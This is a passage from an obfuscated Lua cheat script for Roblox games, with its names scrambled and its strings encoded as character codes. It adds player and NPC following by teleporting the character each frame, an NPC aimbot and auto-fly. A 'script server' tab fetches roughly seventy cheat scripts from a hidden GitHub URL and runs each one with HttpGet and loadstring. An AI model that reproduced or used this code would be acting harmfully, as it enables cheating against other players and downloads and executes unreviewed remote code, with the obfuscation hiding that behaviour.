    Callback = function()
        local 坸飭廲楍鬇騇冩氾 = 牂褫拮迱愽办擈樫()
        熱喫盥嫚杮歡傱萌(utf8.char(23376, 36861), utf8.char(24050, 21047, 26032, 29609, 23478, 21015, 34920, 32, 40) .. #坸飭廲楍鬇騇冩氾 .. utf8.char(32, 20154, 41), 3)
    end,
})

簈漳紃侦隦饩麬旮:Toggle({
    Title = utf8.char(36890, 29992, 23376, 36861),
    Default = false,
    Callback = function(val)
        if val then
            if not 抁唻隖鰿諷跠軡緉 then
                熱喫盥嫚杮歡傱萌(utf8.char(26410, 36873, 25321), utf8.char(35831, 20808, 36873, 25321, 23376, 36861, 30446, 26631), 3)
                return
            end
            壢香亹鵬衣馔謆矣 = 犄瞕炿詑碐糡圃曎.Heartbeat:Connect(function()
                local 矫蟪仠埚窗縈舧粓 = 雺咯尩面固牑蓪梧:FindFirstChild(抁唻隖鰿諷跠軡緉)
                if 矫蟪仠埚窗縈舧粓 and 矫蟪仠埚窗縈舧粓.Character then
                    local 殐尔暣櫷妸婴妬菜 = 矫蟪仠埚窗縈舧粓.Character:FindFirstChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116))
                    local 嵋焚籣毧灈邰太襙 = 矫蟪仠埚窗縈舧粓.Character:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
                    local 约復幣緼嘵泙逰尭 = 葰疀嗂枥訷薠蕠龵()
                    local 宀萵挻勃謻褨醛耯 = 肭家薊屓憍擤榎傯()
                    if 殐尔暣櫷妸婴妬菜 and 嵋焚籣毧灈邰太襙 and 嵋焚籣毧灈邰太襙.Health > 0 and 约復幣緼嘵泙逰尭 then
                        local 鷖霪庡垾軘敟吰牘 = (殐尔暣櫷妸婴妬菜.Position - 约復幣緼嘵泙逰尭.Position).Magnitude
                        local 恓爽鋓髍鬅奱匨觺 = 搋鋈嘵毇憨瀧峜臙
                        -- 距离大于目标距离就靠近
                        if 鷖霪庡垾軘敟吰牘 > 恓爽鋓髍鬅奱匨觺 + 5 then
                            local 護臦荇毞腃龰慢堟 = (殐尔暣櫷妸婴妬菜.Position - 约復幣緼嘵泙逰尭.Position).Unit
                            local 朷襡輳覗蘿绎燫薏 = 鷖霪庡垾軘敟吰牘 > 50 and 3 or 1.5
                            if 曒霹炤轜讥幏疚譱 then 朷襡輳覗蘿绎燫薏 = 朷襡輳覗蘿绎燫薏 * 1.5 end
                            约復幣緼嘵泙逰尭.CFrame = 约復幣緼嘵泙逰尭.CFrame + 護臦荇毞腃龰慢堟 * 朷襡輳覗蘿绎燫薏
                        elseif 鷖霪庡垾軘敟吰牘 < 恓爽鋓髍鬅奱匨觺 - 5 then
                            -- 太近了，后退保持距离
                            local 護臦荇毞腃龰慢堟 = (约復幣緼嘵泙逰尭.Position - 殐尔暣櫷妸婴妬菜.Position).Unit
                            约復幣緼嘵泙逰尭.CFrame = 约復幣緼嘵泙逰尭.CFrame + 護臦荇毞腃龰慢堟 * 1
                        end
                        -- 子追时面朝目标
                        if 鷖霪庡垾軘敟吰牘 < 100 then
                            约復幣緼嘵泙逰尭.CFrame = CFrame.lookAt(约復幣緼嘵泙逰尭.Position, Vector3.new(殐尔暣櫷妸婴妬菜.Position.X, 约復幣緼嘵泙逰尭.Position.Y, 殐尔暣櫷妸婴妬菜.Position.Z))
                        end
                    end
                else
                    if not 矫蟪仠埚窗縈舧粓 or not 矫蟪仠埚窗縈舧粓.Character then
                        熱喫盥嫚杮歡傱萌(utf8.char(23376, 36861), utf8.char(30446, 26631, 24050, 31163, 24320, 25110, 27515, 20129, 65292, 23376, 36861, 26242, 20572), 3)
                    end
                end
            end)
            熱喫盥嫚杮歡傱萌(utf8.char(23376, 36861), utf8.char(24050, 24320, 22987, 23376, 36861, 32) .. 抁唻隖鰿諷跠軡緉, 3)
        else
            if 壢香亹鵬衣馔謆矣 then 壢香亹鵬衣馔謆矣:Disconnect() 壢香亹鵬衣馔謆矣 = nil end
            熱喫盥嫚杮歡傱萌(utf8.char(23376, 36861), utf8.char(24050, 20572, 27490, 23376, 36861), 3)
        end
    end,
})

簈漳紃侦隦饩麬旮:Slider({
    Title = utf8.char(23376, 36861, 36317, 31163),
    Value = {Min = 5, Max = 100, Default = 15},
    Step = 1,
    Callback = function(val) 搋鋈嘵毇憨瀧峜臙 = val end,
})

簈漳紃侦隦饩麬旮:Divider()

--========================================================
-- NPC 自瞄
--========================================================
簈漳紃侦隦饩麬旮:Toggle({
    Title = utf8.char(78, 80, 67, 33258, 30596),
    Default = false,
    Callback = function(val)
        逬貋祝臞噫檿轓谼.NpcAimbot = val
        if val then 荌簦粊呗钩觹穝莐() else 柺權漉訸肯捏摔扟() end
    end,
})

簈漳紃侦隦饩麬旮:Divider()

--========================================================
-- NPC 子追
--========================================================
local 婥疷菑蹂癛蓞攙謺 = nil
local 盔兔寜祀耨谢漠霭 = nil
local 醑嬤谏弟也讦僦岈 = 15
local 糀哶徦牰憣庇鹑欛 = false

local 籵垽痫繤立摫橍竣 = 簈漳紃侦隦饩麬旮:Dropdown({
    Title = utf8.char(78, 80, 67, 30446, 26631),
    Values = 畭亃彆嘫麪淀材沋(),
    Callback = function(val) 婥疷菑蹂癛蓞攙謺 = val end,
})

簈漳紃侦隦饩麬旮:Button({
    Title = utf8.char(21047, 26032, 21015, 34920),
    Callback = function()
        local 坸飭廲楍鬇騇冩氾 = 畭亃彆嘫麪淀材沋()
        熱喫盥嫚杮歡傱萌(utf8.char(78, 80, 67, 23376, 36861), utf8.char(24050, 21047, 26032, 32, 78, 80, 67, 32, 21015, 34920, 32, 40) .. #坸飭廲楍鬇騇冩氾 .. utf8.char(32, 20010, 41), 3)
    end,
})

簈漳紃侦隦饩麬旮:Toggle({
    Title = utf8.char(78, 80, 67, 23376, 36861),
    Default = false,
    Callback = function(val)
        if val then
            if not 婥疷菑蹂癛蓞攙謺 then
                熱喫盥嫚杮歡傱萌(utf8.char(26410, 36873, 25321), utf8.char(35831, 20808, 36873, 25321, 32, 78, 80, 67, 32, 23376, 36861, 30446, 26631), 3)
                return
            end
            盔兔寜祀耨谢漠霭 = 犄瞕炿詑碐糡圃曎.Heartbeat:Connect(function()
                local 鿶瑯贗意杴呴惪匈 = 滚虓鍷損慞嗽锺布(婥疷菑蹂癛蓞攙謺)
                if 鿶瑯贗意杴呴惪匈 then
                    local 殐尔暣櫷妸婴妬菜 = 鿶瑯贗意杴呴惪匈:FindFirstChild(utf8.char(72, 117, 109, 97, 110, 111, 105, 100, 82, 111, 111, 116, 80, 97, 114, 116)) or 鿶瑯贗意杴呴惪匈:FindFirstChild(utf8.char(84, 111, 114, 115, 111)) or 鿶瑯贗意杴呴惪匈:FindFirstChild(utf8.char(85, 112, 112, 101, 114, 84, 111, 114, 115, 111))
                    local 嵋焚籣毧灈邰太襙 = 鿶瑯贗意杴呴惪匈:FindFirstChildOfClass(utf8.char(72, 117, 109, 97, 110, 111, 105, 100))
                    local 约復幣緼嘵泙逰尭 = 葰疀嗂枥訷薠蕠龵()
                    if 殐尔暣櫷妸婴妬菜 and 嵋焚籣毧灈邰太襙 and 嵋焚籣毧灈邰太襙.Health > 0 and 约復幣緼嘵泙逰尭 then
                        local 鷖霪庡垾軘敟吰牘 = (殐尔暣櫷妸婴妬菜.Position - 约復幣緼嘵泙逰尭.Position).Magnitude
                        local 恓爽鋓髍鬅奱匨觺 = 醑嬤谏弟也讦僦岈
                        if 鷖霪庡垾軘敟吰牘 > 恓爽鋓髍鬅奱匨觺 + 5 then
                            local 護臦荇毞腃龰慢堟 = (殐尔暣櫷妸婴妬菜.Position - 约復幣緼嘵泙逰尭.Position).Unit
                            local 朷襡輳覗蘿绎燫薏 = 鷖霪庡垾軘敟吰牘 > 50 and 3 or 1.5
                            if 糀哶徦牰憣庇鹑欛 then 朷襡輳覗蘿绎燫薏 = 朷襡輳覗蘿绎燫薏 * 1.5 end
                            约復幣緼嘵泙逰尭.CFrame = 约復幣緼嘵泙逰尭.CFrame + 護臦荇毞腃龰慢堟 * 朷襡輳覗蘿绎燫薏
                        elseif 鷖霪庡垾軘敟吰牘 < 恓爽鋓髍鬅奱匨觺 - 5 then
                            local 護臦荇毞腃龰慢堟 = (约復幣緼嘵泙逰尭.Position - 殐尔暣櫷妸婴妬菜.Position).Unit
                            约復幣緼嘵泙逰尭.CFrame = 约復幣緼嘵泙逰尭.CFrame + 護臦荇毞腃龰慢堟 * 1
                        end
                        if 鷖霪庡垾軘敟吰牘 < 100 then
                            约復幣緼嘵泙逰尭.CFrame = CFrame.lookAt(约復幣緼嘵泙逰尭.Position, Vector3.new(殐尔暣櫷妸婴妬菜.Position.X, 约復幣緼嘵泙逰尭.Position.Y, 殐尔暣櫷妸婴妬菜.Position.Z))
                        end
                    end
                else
                    熱喫盥嫚杮歡傱萌(utf8.char(78, 80, 67, 23376, 36861), utf8.char(78, 80, 67, 32, 24050, 28040, 22833, 25110, 27515, 20129, 65292, 23376, 36861, 26242, 20572), 3)
                end
            end)
            熱喫盥嫚杮歡傱萌(utf8.char(78, 80, 67, 23376, 36861), utf8.char(24050, 24320, 22987, 23376, 36861, 32) .. 婥疷菑蹂癛蓞攙謺, 3)
        else
            if 盔兔寜祀耨谢漠霭 then 盔兔寜祀耨谢漠霭:Disconnect() 盔兔寜祀耨谢漠霭 = nil end
            熱喫盥嫚杮歡傱萌(utf8.char(78, 80, 67, 23376, 36861), utf8.char(24050, 20572, 27490, 32, 78, 80, 67, 32, 23376, 36861), 3)
        end
    end,
})

簈漳紃侦隦饩麬旮:Slider({
    Title = utf8.char(78, 80, 67, 23376, 36861, 36317, 31163),
    Value = {Min = 5, Max = 100, Default = 15},
    Step = 1,
    Callback = function(val) 醑嬤谏弟也讦僦岈 = val end,
})

簈漳紃侦隦饩麬旮:Toggle({
    Title = utf8.char(78, 80, 67, 33258, 21160, 39134, 34892),
    Default = false,
    Callback = function(val)
        if val then
            糀哶徦牰憣庇鹑欛 = true
            熱喫盥嫚杮歡傱萌(utf8.char(78, 80, 67, 23376, 36861), utf8.char(78, 80, 67, 32, 23376, 36861, 26102, 23558, 33258, 21160, 39134, 34892), 3)
        else
            糀哶徦牰憣庇鹑欛 = false
            熱喫盥嫚杮歡傱萌(utf8.char(78, 80, 67, 23376, 36861), utf8.char(78, 80, 67, 32, 23376, 36861, 39134, 34892, 24050, 20851, 38381), 3)
        end
    end,
})

--========================================================
-- Tab6: 设置
--========================================================
local 蛠茌耦乄箛笻蛐淣 = 瀣梃羢鹟夠伪誥璲:Tab({Title = utf8.char(35774, 32622), Icon = utf8.char(115, 101, 116, 116, 105, 110, 103, 115)})

蛠茌耦乄箛笻蛐淣:Dropdown({
    Title = utf8.char(20027, 39064),
    Values = {utf8.char(80, 105, 110, 107), utf8.char(68, 97, 114, 107), utf8.char(76, 105, 103, 104, 116), utf8.char(86, 105, 111, 108, 101, 116), utf8.char(79, 99, 101, 97, 110)},
    Callback = function(val) pcall(function() WindUI:SetTheme(val) end) end,
})

蛠茌耦乄箛笻蛐淣:Button({
    Title = utf8.char(38144, 27585, 33050, 26412),
    Callback = function()
        酆鏱粼旅隶躲蒹鄞()
        逬貋祝臞噫檿轓谼.Aimbot = false 签蚕喟慺錝焬冿園()
        逬貋祝臞噫檿轓谼.NpcAimbot = false 柺權漉訸肯捏摔扟()
        逬貋祝臞噫檿轓谼.CharRotate = false
        if 唶恧悀爃竓櫈秬繣 then 唶恧悀爃竓櫈秬繣:Disconnect() end
        if 溂盤亟侀锚嚈仱忩 then 溂盤亟侀锚嚈仱忩:Disconnect() end
        if 桂獹芆罴訟橳坼鐦 then 桂獹芆罴訟橳坼鐦:Disconnect() end
        if antiAFKConn then antiAFKConn:Disconnect() end
        if 铵肟綄碂疂垔氛鳤 then 铵肟綄碂疂垔氛鳤:Disconnect() end
        if 儁韣叨毦雇酥峯曳 then 儁韣叨毦雇酥峯曳:Disconnect() end
        if 跪嶝綞顂嵭心醚祌 then 跪嶝綞顂嵭心醚祌:Disconnect() end
        if 连沊襳笁盧燭鏯勃 then 连沊襳笁盧燭鏯勃:Disconnect() end
        if 鰨烋嚏滴鳼蚄西貨 then 鰨烋嚏滴鳼蚄西貨:Disconnect() end
        if 矧襒枓穠繶鳳蚿嶋 then 矧襒枓穠繶鳳蚿嶋:Disconnect() end
        if 牾聜耆晡飼蓛锽折 then 牾聜耆晡飼蓛锽折:Disconnect() end
        if 仪鵄畈燝萷丫哵褲 then 仪鵄畈燝萷丫哵褲:Destroy() end
        if 壢香亹鵬衣馔謆矣 then 壢香亹鵬衣馔謆矣:Disconnect() end
        if 盔兔寜祀耨谢漠霭 then 盔兔寜祀耨谢漠霭:Disconnect() end
        for _, 鉔鲸骆勓簉睹錛犭 in ipairs(葋薸炡渜席煓掬鱼) do 鉔鲸骆勓簉睹錛犭:Disconnect() end
        for p in pairs(橬詤缼便諶休墜毜) do 盼誅锒諳嗽乷卄垓(p) end
        local 莶踯猇淪怩坘蕪难 = 肭家薊屓憍擤榎傯()
        if 莶踯猇淪怩坘蕪难 then 莶踯猇淪怩坘蕪难.WalkSpeed = 16 莶踯猇淪怩坘蕪难.JumpPower = 50 end
        榽拰繶篘瓙骻匠胳.Gravity = 196.2
        歮埡诘揶蛄蘵洽愳.FieldOfView = 70
        local 尜蹆炁迕遲铰膣冹 = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105)):FindFirstChild(utf8.char(87, 105, 110, 100, 85, 73))
        if 尜蹆炁迕遲铰膣冹 then 尜蹆炁迕遲铰膣冹:Destroy() end
        local 鎤衍鋝鸡笲輷棵扑 = game:GetService(utf8.char(67, 111, 114, 101, 71, 117, 105)):FindFirstChild(utf8.char(67, 97, 114, 70, 108, 121, 71, 85, 73))
        if 鎤衍鋝鸡笲輷棵扑 then 鎤衍鋝鸡笲輷棵扑:Destroy() end
    end,
})

--========================================================
-- Tab6: 脚本服务器
--========================================================
local 笘矇袓檯噩餮淨度 = 瀣梃羢鹟夠伪誥璲:Tab({Title = utf8.char(33050, 26412, 26381, 21153, 22120), Icon = utf8.char(115, 101, 114, 118, 101, 114)})

-- GitHub 仓库基础链接
local 逃檩煝萤薱鬔所烜 = utf8.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 71, 71, 71, 55, 57, 50, 47, 82, 111, 98, 108, 111, 120, 65, 101, 114, 111, 83, 99, 114, 105, 112, 116, 115, 47, 109, 97, 105, 110, 47, 65, 101, 114, 111, 37, 69, 54, 37, 57, 67, 37, 56, 48, 37, 69, 54, 37, 57, 54, 37, 66, 48, 37, 69, 53, 37, 57, 48, 37, 56, 56, 37, 69, 57, 37, 57, 66, 37, 56, 54, 47)

-- 脚本列表（名称 → 文件名）
local 铟欲穾脨飷濹莼簱 = {
    {曟諭郞恬夛塮頻秐 = utf8.char(56, 20010, 29699, 27744, 32463, 20856), file = utf8.char(56, 20010, 29699, 27744, 32463, 20856, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(57, 57, 32, 22812), file = utf8.char(57, 57, 32, 22812, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(66, 108, 111, 120, 32, 70, 114, 117, 105, 116), file = utf8.char(66, 108, 111, 120, 32, 70, 114, 117, 105, 116, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(68, 117, 110, 103, 101, 111, 110, 32, 72, 117, 110, 116, 101, 114, 115), file = utf8.char(68, 117, 110, 103, 101, 111, 110, 32, 72, 117, 110, 116, 101, 114, 115, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(71, 66), file = utf8.char(71, 66, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(99, 104, 97, 105, 110), file = utf8.char(99, 104, 97, 105, 110, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(112, 111, 22823, 112, 111), file = utf8.char(112, 111, 22823, 112, 111, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(20030, 37325, 27169, 25311, 22120), file = utf8.char(20030, 37325, 27169, 25311, 22120, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(20129, 21629, 36895, 36882), file = utf8.char(20129, 21629, 36895, 36882, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(20445, 25252, 25151, 23376, 19981, 21463, 24618, 29289, 20837, 20405), file = utf8.char(20445, 25252, 25151, 23376, 19981, 21463, 24618, 29289, 20837, 20405, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(20687, 32032, 20043, 20995), file = utf8.char(20687, 32032, 20043, 20995, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(20725, 23608, 20043, 22612), file = utf8.char(20725, 23608, 20043, 22612, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(20725, 23608, 29983, 23384, 31454, 25216, 22330), file = utf8.char(20725, 23608, 29983, 23384, 31454, 25216, 22330, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(20811, 38534, 29579, 22269, 22823, 20136), file = utf8.char(20811, 38534, 29579, 22269, 22823, 20136, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(20915, 26007, 22330), file = utf8.char(20915, 26007, 22330, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(20992, 20995, 29699), file = utf8.char(20992, 20995, 29699, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(21010, 24320, 22823, 28023), file = utf8.char(21010, 24320, 22823, 28023, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(21147, 37327, 20256, 22855), file = utf8.char(21147, 37327, 20256, 22855, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(21335, 26497, 27954, 25506, 38505), file = utf8.char(21335, 26497, 27954, 25506, 38505, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(21551, 31034, 24405), file = utf8.char(21551, 31034, 24405, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(22900, 25165, 22823, 20136), file = utf8.char(22900, 25165, 22823, 20136, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(23547, 25214, 24040, 22411, 40060), file = utf8.char(23547, 25214, 24040, 22411, 40060, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(24179, 28369, 20999, 29255), file = utf8.char(24179, 28369, 20999, 29255, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(24378, 22766, 20256, 22855), file = utf8.char(24378, 22766, 20256, 22855, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(24525, 32773, 20256, 22855), file = utf8.char(24525, 32773, 20256, 22855, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(25106, 32593, 30270, 20013, 24515), file = utf8.char(25106, 32593, 30270, 20013, 24515, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(25112, 20105, 26426, 22120), file = utf8.char(25112, 20105, 26426, 22120, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(25163, 26538, 31454, 25216, 22330), file = utf8.char(25163, 26538, 31454, 25216, 22330, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(25749, 21676, 20043, 22812), file = utf8.char(25749, 21676, 20043, 22812, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(26080, 23478, 21487, 24402), file = utf8.char(26080, 23478, 21487, 24402, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(26368, 24378, 25112, 22330), file = utf8.char(26368, 24378, 25112, 22330, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(26368, 24378, 30340, 25331, 20987, 27169, 25311, 22120), file = utf8.char(26368, 24378, 30340, 25331, 20987, 27169, 25311, 22120, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(26376, 29699, 22686, 37327), file = utf8.char(26376, 29699, 22686, 37327, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(26408, 31567, 49, 48, 49, 22825, 29983, 23384), file = utf8.char(26408, 31567, 49, 48, 49, 22825, 29983, 23384, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(26497, 36895, 20256, 22855), file = utf8.char(26497, 36895, 20256, 22855, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(27169, 20223, 32773), file = utf8.char(27169, 20223, 32773, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(27515, 38081, 36712), file = utf8.char(27515, 38081, 36712, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(27599, 27493, 43, 49, 32, 26234, 21830), file = utf8.char(27599, 27493, 43, 49, 32, 26234, 21830, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(27700, 25163, 30862, 29255), file = utf8.char(27700, 25163, 30862, 29255, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(27773, 36710, 32463, 38144, 21830, 22823, 20136), file = utf8.char(27773, 36710, 32463, 38144, 21830, 22823, 20136, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(27785, 40664, 30340, 21050, 23458), file = utf8.char(27785, 40664, 30340, 21050, 23458, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(28369, 30707, 22836, 82, 78, 71), file = utf8.char(28369, 30707, 22836, 82, 78, 71, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(28779, 29699, 35757, 32451), file = utf8.char(28779, 29699, 35757, 32451, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(28779, 31661, 21457, 23556, 27169, 25311, 22120), file = utf8.char(28779, 31661, 21457, 23556, 27169, 25311, 22120, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(29359, 32618), file = utf8.char(29359, 32618, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(29983, 23384, 20110, 26432, 25163), file = utf8.char(29983, 23384, 20110, 26432, 25163, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(30011, 25105), file = utf8.char(30011, 25105, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(30417, 29425, 27893), file = utf8.char(30417, 29425, 27893, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(30719, 20117), file = utf8.char(30719, 20117, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(30733, 20240, 26641, 26408), file = utf8.char(30733, 20240, 26641, 26408, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(30772, 22351, 32773, 35868, 22242, 50), file = utf8.char(30772, 22351, 32773, 35868, 22242, 50, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(31181, 26893, 33457, 22253), file = utf8.char(31181, 26893, 33457, 22253, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(31454, 20105, 23545, 25163), file = utf8.char(31454, 20105, 23545, 25163, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(33457, 22253, 22320, 24179, 32447), file = utf8.char(33457, 22253, 22320, 24179, 32447, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(34880, 20538), file = utf8.char(34880, 20538, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(34880, 33394, 22320, 24102), file = utf8.char(34880, 33394, 22320, 24102, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(35757, 32451, 24618, 20861, 36827, 34892, 30772, 22351), file = utf8.char(35757, 32451, 24618, 20861, 36827, 34892, 30772, 22351, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(35781, 21650, 20043, 20995), file = utf8.char(35781, 21650, 20043, 20995, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(36229, 30495, 23454, 99, 115, 103, 111), file = utf8.char(36229, 30495, 23454, 99, 115, 103, 111, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(36229, 39640, 36895, 36305, 32773), file = utf8.char(36229, 39640, 36895, 36305, 32773, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(36855, 20320, 24093, 22269), file = utf8.char(36855, 20320, 24093, 22269, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(36896, 33337, 23547, 23453), file = utf8.char(36896, 33337, 23547, 23453, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(37329, 24065, 28857, 20987, 22120), file = utf8.char(37329, 24065, 28857, 20987, 22120, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(38035, 40060, 27169, 25311, 22120), file = utf8.char(38035, 40060, 27169, 25311, 22120, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(38378, 20809), file = utf8.char(38378, 20809, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(38450, 24481), file = utf8.char(38450, 24481, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(38598, 35013, 31665, 82, 78, 71), file = utf8.char(38598, 35013, 31665, 82, 78, 71, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(39184, 21381, 22823, 20136, 51), file = utf8.char(39184, 21381, 22823, 20136, 51, 46, 108, 117, 97)},
    {曟諭郞恬夛塮頻秐 = utf8.char(40104, 40060, 21676), file = utf8.char(40104, 40060, 21676, 46, 108, 117, 97)},
}

-- 远程加载脚本的函数
local function 蟙悄峛鉋漨勬傆憀(scriptName, fileName)
    local 竫觼栘厊涏啊靗鏜 = 逃檩煝萤薱鬔所烜 .. 祏愤芰捘膴跏蟫緶:UrlEncode(fileName)
    熱喫盥嫚杮歡傱萌(utf8.char(27491, 22312, 21152, 36733), utf8.char(27491, 22312, 33719, 21462, 32) .. scriptName .. utf8.char(32, 28304, 30721, 46, 46, 46), 3)
    local 楀棅多汔蕁蟒渃熀, result = pcall(function()
        return game:HttpGet(竫觼栘厊涏啊靗鏜)
    end)
    if 楀棅多汔蕁蟒渃熀 and result then
        local 哜燱砮奙妌蕫矅螈, execErr = pcall(function()
            loadstring(result)()
        end)
        if 哜燱砮奙妌蕫矅螈 then
            熱喫盥嫚杮歡傱萌(utf8.char(21152, 36733, 25104, 21151), scriptName .. utf8.char(32, 24050, 25104, 21151, 36816, 34892, 33), 3)
        else
            鯭粛杲崐愿騒泪詛(utf8.char(25191, 34892, 22833, 36133), tostring(execErr))
        end
    else
        鯭粛杲崐愿騒泪詛(utf8.char(33719, 21462, 22833, 36133), utf8.char(26080, 27861, 33719, 21462, 32) .. scriptName .. utf8.char(32, 30340, 28304, 30721))
    end
end

-- 搜索框
笘矇袓檯噩餮淨度:Input({
    Title = utf8.char(25628, 32034, 33050, 26412),
    Placeholder = utf8.char(36755, 20837, 33050, 26412, 21517, 31216, 25628, 32034, 46, 46, 46),
    Callback = function(text)
        -- WindUI Dropdown 没有动态搜索，这里仅做提示
        if text and #text > 0 then
            local 酃嬡漦蛽签騀頙塴 = false
            for _, s in ipairs(铟欲穾脨飷濹莼簱) do
                if string.find(string.lower(s.曟諭郞恬夛塮頻秐), string.lower(text), 1, true) then
                    酃嬡漦蛽签騀頙塴 = true
                    break
                end
            end
            if not 酃嬡漦蛽签騀頙塴 then
                熱喫盥嫚杮歡傱萌(utf8.char(25628, 32034, 32467, 26524), utf8.char(26410, 25214, 21040, 21305, 37197, 32, 95, 95, 83, 84, 82, 95, 49, 95, 95, 32, 30340, 33050, 26412), 3)
            end
        end
    end,
})

笘矇袓檯噩餮淨度:Divider()

-- 脚本下拉选择 + 执行按钮
local 鐙覙問裛侫败舝鑻 = nil

local 蛩垯科鶯辟染揮鸯 = 笘矇袓檯噩餮淨度:Dropdown({
    Title = utf8.char(36873, 25321, 33050, 26412),
    Values = (function()
        local 醴鬪伦飽眃親浜郇 = {}
        for _, s in ipairs(铟欲穾脨飷濹莼簱) do
            table.insert(醴鬪伦飽眃親浜郇, s.曟諭郞恬夛塮頻秐)
        end
        return 醴鬪伦飽眃親浜郇
    end)(),
    Callback = function(val) 鐙覙問裛侫败舝鑻 = val end,
})

笘矇袓檯噩餮淨度:Button({
    Title = utf8.char(25191, 34892, 36873, 20013, 33050, 26412),
    Callback = function()
        if 鐙覙問裛侫败舝鑻 then
            for _, s in ipairs(铟欲穾脨飷濹莼簱) do
                if s.曟諭郞恬夛塮頻秐 == 鐙覙問裛侫败舝鑻 then
                    蟙悄峛鉋漨勬傆憀(s.曟諭郞恬夛塮頻秐, s.file)
                    return
                end
            end
        else
            熱喫盥嫚杮歡傱萌(utf8.char(25552, 31034), utf8.char(35831, 20808, 36873, 25321, 19968, 20010, 33050, 26412), 3)
        end
    end,
})

笘矇袓檯噩餮淨度:Button({
    Title = utf8.char(21047, 26032, 33050, 26412, 21015, 34920),
    Callback = function()
        local 醴鬪伦飽眃親浜郇 = {}
        for _, s in ipairs(铟欲穾脨飷濹莼簱) do
